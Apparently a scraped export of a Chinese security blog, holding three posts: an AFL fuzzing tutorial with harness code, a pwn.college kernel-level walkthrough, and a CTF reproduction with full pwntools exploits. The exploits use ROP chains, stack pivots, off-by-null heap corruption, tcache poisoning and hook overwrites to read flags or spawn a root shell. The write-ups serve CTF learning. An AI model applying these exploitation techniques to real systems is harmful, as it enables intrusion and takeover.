egg!                *(char *)1 = 2;        &#125;        else        &#123;                return 1;        &#125;        return 0;&#125;int main(int argc, char *argv[])&#123;        char *usage = &quot;Usage: %s\\n&quot;                                  &quot;Text utility - accepts commands and data on stdin and prints results to stdout.\\n&quot;                                  &quot;\\tInput             | Output\\n&quot;                                  &quot;\\t------------------+-----------------------\\n&quot;                                  &quot;\\tu &lt;N&gt; &lt;string&gt;    | Uppercased version of the first &lt;N&gt; bytes of &lt;string&gt;.\\n&quot;                                  &quot;\\thead &lt;N&gt; &lt;string&gt; | The first &lt;N&gt; bytes of &lt;string&gt;.\\n&quot;;        char input[INPUTSIZE] = &#123;0&#125;;        // Slurp input                if (read(STDIN_FILENO, input, INPUTSIZE) &lt; 0)        &#123;                fprintf(stderr, &quot;Couldn&#x27;t read stdin.\\n&quot;);        &#125;        int ret = process(input);        if (ret)        &#123;                fprintf(stderr, usage, argv[0]);        &#125;;        return ret;&#125;\n\n基本功能:\nu  ：对字符串的前n个字节变成大写字符串；head  ：截取字符串的前n个字符；surprise!：隐藏功能，直接触发崩溃。运行afl-fuzz对程序进行测试：\nafl-fuzz -i inputs -o output ./vulnerable\n\ninputs目录是输入的种子目录，由用户提供，应该是精心准备的样本以有效提高fuzz效率，可以看到项目提供的inputs目录中包含触发u和head的样例：\nyoulin@ubuntu:~/afl/afl-training/quickstart$ ls inputs/head  uyoulin@ubuntu:~/afl/afl-training/quickstart$ cat inputs/head head 20 This string is going to be truncated at the 20th position.youlin@ubuntu:~/afl/afl-training/quickstart$ cat inputs/uu 4 capsmeyoulin@ubuntu:~/afl/afl-training/quickstart$\n\nfuzz结果:\n\nout有相应的产出，其中crashes目录存储的是崩溃样本；queue目录存储的是成果触发新路径的样本即有趣的样本(即新路径)。\n查看output当中的crashes并运行查看效果\n\n通过这个小的demo来体验afl fuzz的过程，对afl有了初步的了解。\nharnessharness的作用是通过demo来体验如何针对具体的库代码来编写测试框架。\n这个项目当中的流程演示图:\n\n研究测试人员创建输入目录并提供变异的语料库（input corpus）；针对测试代码编写测试框架（write harness），经过afl-clang-fast&#x2F;afl-gcc插桩编译后产生支持反馈模糊测试的二进制程序；afl-fuzz从队列（queue）中挑选种子进行变异；变异后的样本扔给测试框架（harness）运行并监控运行结果；如果崩溃，则存储到崩溃目录中（crashes）；如果样本成功触发了新路径，则将它添加到队列（queue）当中。\n本次实验是通过编写代码对library库进行测试\nlibrary.h:\n#include &lt;unistd.h&gt;// an &#x27;nprintf&#x27; implementation - print the first len bytes of datavoid lib_echo(char *data, ssize_t len);// optimised multiply - returns x*yint  lib_mul(int x, int y);\n\nlibrary.c:\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;#include &quot;library.h&quot;void lib_echo(char *data, ssize_t len)&#123;\tif(strlen(data) == 0) &#123;\t\treturn;\t&#125;\tchar *buf = calloc(1, len);\tstrncpy(buf, data, len);\tprintf(&quot;%s&quot;,buf);\tfree(buf);\t// A crash so we can tell the harness is working for lib_echo\tif(data[0] == &#x27;p&#x27;) &#123;\t\tif(data[1] == &#x27;o&#x27;) &#123;\t\t\tif(data[2] ==&#x27;p&#x27;) &#123;\t\t\t\tif(data[3] == &#x27;!&#x27;) &#123;\t\t\t\t\tassert(0);\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;&#125;int  lib_mul(int x, int y)&#123;\tif(x%2 == 0) &#123;\t\treturn y &lt;&lt; x;\t&#125; else if (y%2 == 0) &#123;\t\treturn x &lt;&lt; y;\t&#125; else if (x == 0) &#123;\t\treturn 0;\t&#125; else if (y == 0) &#123;\t\treturn 0;\t&#125; else &#123;\t\treturn x * y;\t&#125;&#125;\n\n本次实验是通过编写代码对这两个函数进行fuzz\n两个函数的功能\n\nlib_echo:输出参数data中的前len个字符串；\nlib_mul:输出参数x乘以y的值。\n\n为了实现目的，编写的程序必须具有一下功能:\n\n编译出来的程序必须是可执行的，即需要一个main函数，从而被编译成可执行的二进制程序；\n\n具备反馈信息的能力以使afl更高效的fuzz，即编写出来的代码需要使用afl-clang-fast或afl-clang或afl-gcc进行插桩编译；\n\n提供数据接口以供afl进行变异；即两个函数使用的参数数据应来自于标准输入或文件，使得afl可以很方便的变异。\n\n\n最终编写出如下代码:\n#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &quot;library.h&quot;// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function#define SIZE 100int main(int argc, char* argv[]) &#123;    if((argc == 2) &amp;&amp; strcmp(argv[1], &quot;echo&quot;) == 0) &#123;        // make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.        char input[SIZE] = &#123;0&#125;;        ssize_t length;        length = read(STDIN_FILENO, input, SIZE);        lib_echo(input, length);    &#125; else if ((argc == 2) &amp;&amp; strcmp(argv[1], &quot;mul&quot;) == 0) &#123;        int a,b = 0;        read(STDIN_FILENO, &amp;a, 4);        read(STDIN_FILENO, &amp;b, 4);        printf(&quot;%d\\n&quot;, lib_mul(a,b));    &#125; else &#123;        printf(&quot;Usage: %s mul|echo\\n&quot;, argv[0]);    &#125;&#125;\n\n可以看到main函数当中由命令行参数决定是对libc_echo函数进行测试还是对libc_mul进行模糊测试；接着由标准输入作为参数对函数进行调用；最后由afl-clang-fast对程序进行插桩编译\n编译的命令是：\nAFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness\n\n接下来先对libc_echo库函数进行模糊测试:\nyoulin@ubuntu:~/afl/afl-training/harness$ rm -rf input_echo/youlin@ubuntu:~/afl/afl-training/harness$ mkdir input_echoyoulin@ubuntu:~/afl/afl-training/harness$ echo aaaa &gt; input_echo/seedyoulin@ubuntu:~/afl/afl-training/harness$ afl-fuzz -i input_echo/ -o output_echo ./harness echo\n\n没过多久就fuzz出了crashes：\n\n接着对libc_mul进行模糊测试\nyoulin@ubuntu:~/afl/afl-training/harness$ mkdir input_mulyoulin@ubuntu:~/afl/afl-training/harness$ echo &quot;1 3 &quot; &gt; input_mul/seedyoulin@ubuntu:~/afl/afl-training/harness$ afl-fuzz -i input_mul -o output_mul ./harness mul\n\n\n通过这个demo可以理解在对特定的目标进行模糊测试时，如何基于afl编写优化框架来对代码进行模糊测试。\n"},{"title":"通过pwncollege学习kernel","url":"/2024/01/22/%E9%80%9A%E8%BF%87pwncollege%E5%AD%A6%E4%B9%A0kernel/","content":"前言题目链接:https://pwn.college/system-security/kernel-security\n前面几题都还是比较简单的，用作熟悉kernel，笔者认为刚刚好\n但是pwncollege的题目都需要用靶场本身的虚拟机做，逆向的时候可能会很卡，所以可以选择在他们的github上将题目下载下来，再到本机进行逆向，然后再到他们的虚拟机内进行做题\ngithub链接:https://github.com/pwncollege/system-security-dojo/tree/main/kernel-security\nlevel1.0首先看他的初始化函数，将flag读入了flag变量当中，使用 proc_create 创建虚拟 proc 文件 pwncollege，这个文件会出现在 /proc/pwncollege\n\n先看他的read函数:\n如果device_state为2程序就会将flag这个变量赋值给用户变量buffer\n\n接着看他的write函数:\n如果他的password为这个snceewqvyntlwfha，device_state就会为2了\n\n根据上面的分析，先用open打开&#x2F;proc&#x2F;pwncollege，然后用write修改device_state为2，然后利用read将flag赋值给用户变量，接着就可以将flag打印出来了\nexp:\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main() &#123;  char buffer[100];  int fd=open(&quot;/proc/pwncollege&quot;,O_RDWR);  char key[]=&quot;gkklnaumhysmwksq&quot;;  write(fd,key,sizeof(key));  read(fd,buffer,100);  printf(&quot;%s&quot;,buffer);  return 0;&#125;\n\n\nlevel1.1和前面一题几乎一样的，只是对题目增加了一点逆向，并且换了一下password\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main() &#123;  char buffer[100];  int fd=open(&quot;/proc/pwncollege&quot;,O_RDWR);  char key[]=&quot;bbhlnbpoisiduufx&quot;;  write(fd,key,sizeof(key));  read(fd,buffer,100);  printf(&quot;%s&quot;,buffer);  return 0;&#125;\n\n\nlevel2.0除了write函数稍有变化，其他函数都没什么太大变化\n从下图可以看到，我们只需要将password传入就可以直接将flag打印出来了\n\nexp：\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main() &#123;  char buffer[100];  int fd=open(&quot;/proc/pwncollege&quot;,O_RDWR);  char key[]=&quot;exziykkjtlbpfcbn&quot;;  write(fd,key,sizeof(key));  return 0;&#125;\n\n需要注意的是，内核中打印出来的信息不会直接返回给用户，需要使用dmesg指令查看内核的输出信息才能看到flag\nlevel3.0也是直接输入password，但是不会直接输出flag了，程序给了win函数，执行完之后会将程序的权限改为root\n\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main() &#123;  char buffer[100];  int fd=open(&quot;/proc/pwncollege&quot;,O_RDWR);  char key[]=&quot;izqbzupwclnrwugw&quot;;  write(fd,key,sizeof(key));  system(&quot;/bin/sh&quot;);  return 0;&#125;\n\n\nlevel4.0和前面差不多，但是write没了，改为调用ioctl函数\n只需要控制一下cmd，和key就好了\n\nexp：\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main() &#123;  char buffer[100];  int fd=open(&quot;/proc/pwncollege&quot;,O_RDWR);  char key[]=&quot;bzwgjygwcmubnzhp&quot;;  ioctl(fd,1337,key);  system(&quot;/bin/sh&quot;);  return 0;&#125;\n\n\n"},{"title":"鹏城杯复现","url":"/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/","content":"silent一个只有输入的题目\n\n看puruse师傅的exp是找到了一个gadget:\n0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret\n\n根据经验找关于add的gadget：\nROPgadget --binary silent |grep add\n\n接着就是想办法栈迁移到bss段上并且利用csu上面的gadget控制rbx寄存器从而修改bss段上的stdout\n先计算出stdout的地址与puts的真实地址之间的偏移:\n\n转换为16进制：0xffffffffffc94210\n\n这时候就可以确定思路将stdout的真实地址修改为puts,payload:\npayload=b&#x27;A&#x27;*0x40+b&#x27;A&#x27;*8+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0xffffffffffc94210)+p64(stdout+0x3d)+p64(0)*4+p64(magic)+p64(pop_rsi_r15)+p64(0x601b10)+p64(0)+p64(read_plt)+p64(pop_rbp)+p64(0x601b10-8)+p64(leave_ret)s(payload)\n\n接着再利用csu的call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8],call stdout从而调用puts泄露出libc地址，payload:\npayload1=p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)+p64(1)+p64(0x601020)+p64(elf.got[&#x27;alarm&#x27;])+p64(0)*2+p64(csu_2)+p64(pop_rsi_r15)+p64(0x601310)+p64(0)+p64(1)+p64(2)+p64(3)+p64(4)+p64(pop_rbp)+p64(0x601a00+0x40)+p64(read_ptr)+b&#x27;./flag\\x00\\x00&#x27;s(payload1)\n\n最后就是利用栈迁移打orw了\n完整exp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./silent&quot;elf = ELF(banary)libc = ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;172.10.0.8&#x27;port = 9999local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; retmagic = 0x00000000004007e8pop_rdi=0x0000000000400963pop_rsi_r15=0x0000000000400961read_plt=elf.plt[&#x27;read&#x27;]read_got=elf.got[&#x27;read&#x27;]bss=0x000000000601040read_ptr=0x0000000004008DCleave_ret=0x0000000000400876stdout=0x000000000601020csu_1=0x000000000400956csu_2=0x000000000400940pop_rbx_rbp_r12_r13_r14_r15=0x000000000040095Apop_rbp=0x0000000000400788payload=b&#x27;A&#x27;*0x40+b&#x27;A&#x27;*8+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0xffffffffffc94210)+p64(stdout+0x3d)+p64(0)*4+p64(magic)+p64(pop_rsi_r15)+p64(0x601b10)+p64(0)+p64(read_plt)+p64(pop_rbp)+p64(0x601b10-8)+p64(leave_ret)s(payload)payload1=p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)+p64(1)+p64(0x601020)+p64(elf.got[&#x27;alarm&#x27;])+p64(0)*2+p64(csu_2)+p64(pop_rsi_r15)+p64(0x601310)+p64(0)+p64(1)+p64(2)+p64(3)+p64(4)+p64(pop_rbp)+p64(0x601a00+0x40)+p64(read_ptr)+b&#x27;./flag\\x00\\x00&#x27;s(payload1)libcbase=uu64()-libc.sym[&#x27;alarm&#x27;]lg(&quot;libcbase&quot;)open=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]pop_rsi=0x0000000000023a6a+libcbasepop_rdx=0x0000000000001b96+libcbaseorw=b&#x27;A&#x27;*0x40+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(0x601b10 + len(payload1) - 8)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open)orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(elf.bss(0x800))+p64(pop_rdx)+p64(0x100)+p64(read)orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(elf.bss(0x800))+p64(pop_rdx)+p64(0x100)+p64(write)io.send(orw)ia()\n\nbabyheap标准的菜单题，并且在edit和add里面都有off by null漏洞，libc版本为2.38，根据henry师傅的思路选择打栈\n\nexp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./babyheap&quot;elf = ELF(banary)libc = ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(12),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def menu(opt):  sla(&#x27;&gt;&gt;&#x27;,str(opt))  # sl(str(opt))def add(size,data):  menu(1)  sla(b&quot;input your name size&quot;,str(size))  sla(b&quot;input your name&quot;,data)def delete(index):  menu(4)  sla(b&#x27;input index\\n&#x27;,str(index))def show(index):  menu(3)  sla(b&#x27;input index\\n&#x27;,str(index))def edit(index,size,name):  menu(2)  sla(b&#x27;input index&#x27;,str(index))  sla(b&#x27;input your name size&#x27;,str(size))  sa(b&#x27;input your name&#x27;,name)ru(&quot;0x&quot;)heapbase=iuu64()-0x2a0lg(&quot;heapbase&quot;)fake_size=0x1940fake_chunk=p64(0)+p64(fake_size)+p64(heapbase+0x2c0)*2#off by nulladd(0x4f8,fake_chunk)#0add(0x408,b&#x27;AAAA&#x27;)#1add(0x408,b&#x27;AAAA&#x27;)#2add(0x408,b&#x27;AAAA&#x27;)#3add(0x408,b&#x27;AAAA&#x27;)#4add(0x408,b&#x27;AAAA&#x27;)#5add(0x4f8,b&#x27;AAAA&#x27;)#6add(0x4f8,b&#x27;AAAA&#x27;)#7payload=b&#x27;A&#x27;*0x400+p64(fake_size)edit(5,0x408,payload)delete(6)#leak libcadd(0x4e8,b&#x27;AAAA&#x27;)#6add(0x480,b&#x27;AAAA&#x27;)#8add(0x480,b&#x27;AAAA&#x27;)#9delete(8)add(0x490,b&#x27;AAAA&#x27;)#8show(1)libcbase=uu64()-0x1ff110lg(&quot;libcbase&quot;)system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi=libcbase+0x0000000000028715environ=libcbase+0x206258stdout=libcbase+0x1ff7a0ret=libcbase+0x0000000000026a3e#2 attack tcache_structdelete(2)delete(3)payload=b&#x27;A&#x27;*0x380+p64(0)+p64(0x411)+p64((heapbase+0x10)^(heapbase&gt;&gt;12))edit(9,0x480,payload)sl(b&#x27;1&#x27;)add(0x400,b&#x27;AAAA&#x27;)#2payload=p64(1)+p64(0)*14+p64(0x007000000000000)+p64(0x000556111e1e2a0)payload=payload.ljust(0x278,b&#x27;\\x00&#x27;)+p64(stdout)add(0x400,payload)#3#leak stackpayload=p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)*4add(0x400,payload)stack=uu64()lg(&quot;stack&quot;)ret_addr=stack-0x120lg(&quot;ret_addr&quot;)payload=p64(1)+p64(0)*14+p64(0x007000000000000) + p64(0x0000556111e1e2a0)payload=payload.ljust(0x278,b&#x27;\\x00&#x27;)+p64(ret_addr-8)edit(3,0x380,payload)payload1=p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)sl(b&#x27;1&#x27;)add(0x400,payload1)menu(5)ia()\n\natuo_coffee_sale_machineexp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&quot;)ip = &#x27;172.10.0.9&#x27;port = 8888local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):\tru(&quot;&gt;&gt;&gt;&quot;)\tsl(str(choice))def sell(id,flag=0,content=&#x27;youlin&#x27;):\tcmd(1)\tsla(&#x27;want to buy\\n&#x27;, str(id))\tif flag:\t\tsla(&#x27;add something?Y/N\\n&#x27;, b&#x27;Y&#x27;)\t\tsa(&#x27;need in coffee\\n&#x27;, content)\telse:\t\tsla(&#x27;add something?Y/N\\n&#x27;, b&#x27;N&#x27;)\tdef buy(id, flag=0, content=&#x27;youlin&#x27;):\tcmd(1)\tsla(&#x27;want to buy\\n&#x27;, str(id))\tif flag:\t\tsla(&#x27;add something?Y/N\\n&#x27;, b&#x27;Y&#x27;)\t\tsa(&#x27;need in coffee\\n&#x27;, content)\telse:\t\tsla(&#x27;add something?Y/N\\n&#x27;, b&#x27;N&#x27;)\tdef admin():\tcmd(4421)\tsa(&#x27;admin password\\n&#x27;, b&#x27;just pwn it&#x27;)def back():\tcmd(3)def replenish(id):\tadmin()\tcmd(1)\tcmd(id)\tback()def change(id, coffee, content):\tadmin()\tcmd(2)\tcmd(id)\tcmd(coffee)\tsa(&#x27;your content\\n&#x27;, content)\tback()buy(1)buy(1)change(1, 2, p64(0x4062F0))for i in range(7):\tbuy(2)for i in range(7):\treplenish(2)change(2, 7, p64(0x406068))cmd(1)libc_base = uu64() - libc.sym[&#x27;atol&#x27;]lg(&#x27;libc_base&#x27;)sla(&#x27;want to buy\\n&#x27;, b&#x27;2&#x27;)sla(&#x27;add something?Y/N\\n&#x27;, b&#x27;N&#x27;)buy(2)change(2, 2, p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 8))for i in range(7):\tsell(3)for i in range(7):\treplenish(3)change(3, 7, p64(0) + p64(libc_base + libc.sym[&#x27;system&#x27;]))buy(3, 1, b&#x27;/bin/sh&#x27;)ia()\n\n"}]